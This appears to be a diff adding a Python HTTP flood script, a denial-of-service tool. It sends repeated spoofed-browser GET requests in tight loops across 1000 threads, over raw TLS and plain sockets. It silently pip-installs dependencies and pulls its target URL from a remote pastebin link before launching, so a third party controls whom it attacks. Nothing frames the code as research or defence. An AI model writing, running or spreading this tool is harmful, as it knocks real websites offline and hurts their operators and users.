@@ -1,0 +1,270 @@
+import random, time, ssl, threading, sys
+
+from urllib.parse import urlparse
+
+import os
+
+try:
+
+    import requests
+
+except:
+
+    os.system("clear")
+
+    os.system("pip install requests")
+
+    os.system("clear")
+
+try:
+
+    import socks
+
+except:
+
+    os.system("clear")
+
+    os.system("pip install PySocks")
+
+    os.system("clear")
+
+useragent_list = [
+
+        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
+
+        "Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
+
+        "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36",
+
+        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0",
+
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
+
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
+
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.1 Safari/605.1.15",
+
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
+
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
+
+        "Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1",
+
+        "Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)",
+
+        "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
+
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
+
+        "Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
+
+        "Mozilla/5.0 (Linux; Android 12; M1908C3JGG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
+
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/105.0.5195.52 Safari/537.36",
+
+        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
+
+        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
+
+        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
+
+        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
+
+        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
+
+        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
+
+        "Mozilla/5.0 (Linux; U; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 OPR/46.0.2254.145391",
+
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
+
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
+
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
+
+        "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
+
+        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
+
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
+
+        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
+
+        "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00"]
+
+def http_get(url, timer):
+
+    timeoutke = time.time() + int(timer)
+
+    request = "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+
+    request += "Upgrade-Insecure-Requests: 1\r\n"
+
+    request += "User-Agent: " + random.choice(useragent_list) + "\r\n"
+
+    request += "Accept-Encoding: gzip, deflate, br\r\n"
+
+    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+
+    request += "X-Forwarded-Proto: Http\r\n"
+
+    request += "Sec-GPC: 1\r\n"
+
+    request += "Sec-Fetch-Site: none\r\n"
+
+    request += "Sec-Fetch-Mode: navigate\r\n"
+
+    request += "Sec-Fetch-User: ?1\r\n"
+
+    request += "Sec-Fetch-Dest: document\r\n"
+
+    request += "Connection: Keep-Alive\r\n\r\n"
+
+    while time.time() < timeoutke:
+
+        try:
+
+            s = socks.socksocket()
+
+            s.connect((str(urlparse(url).netloc), int(443)))
+
+            ctx = ssl.SSLContext()
+
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+
+            try:
+
+                for i in range(5000000000):
+
+                    s.send(str.encode(request))
+
+                    s.send(str.encode(request))
+
+                    s.send(str.encode(request))
+
+            except:
+
+                continue
+
+        except:
+
+            continue
+
+def http_flood(url, timer):
+
+    timeoutke = time.time() + int(timer)
+
+    request = "GET " + "/" + " HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+
+    request += "Upgrade-Insecure-Requests: 1\r\n"
+
+    request += "User-Agent: " + random.choice(useragent_list) + "\r\n"
+
+    request += "Accept-Encoding: gzip, deflate, br\r\n"
+
+    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+
+    request += "X-Forwarded-Proto: Http\r\n"
+
+    request += "Sec-GPC: 1\r\n"
+
+    request += "Sec-Fetch-Site: none\r\n"
+
+    request += "Sec-Fetch-Mode: navigate\r\n"
+
+    request += "Sec-Fetch-User: ?1\r\n"
+
+    request += "Sec-Fetch-Dest: document\r\n"
+
+    request += "Connection: Keep-Alive\r\n\r\n"
+
+    while time.time() < timeoutke:
+
+        try:
+
+            s = socks.socksocket()
+
+            s.connect((str(urlparse(url).netloc), int(80)))
+
+            try:
+
+                for i in range(5000000000):
+
+                    s.send(str.encode(request))
+
+                    s.send(str.encode(request))
+
+                    s.send(str.encode(request))
+
+            except:
+
+                continue
+
+        except:
+
+            continue
+
+def launch(url, timer, threads):
+
+    try:
+
+        for i in range(int(threads)):
+
+            threading.Thread(target=http_get, args=(url, timer), daemon=True).start()
+
+    except:
+
+        pass
+
+def send_attack(url, timer, threads):
+
+    try:
+
+        for i in range(int(threads)):
+
+            threading.Thread(target=http_flood, args=(url, timer), daemon=True).start()
+
+    except:
+
+        pass
+
+try:
+
+    import requests
+
+except:
+
+    os.system("clear")
+
+    os.system("pip install requests")
+
+    os.system("clear")
+
+link=requests.get("https://pastebin.com/raw/LAesZGTS").text
+
+
+launch(link,100000,1000)
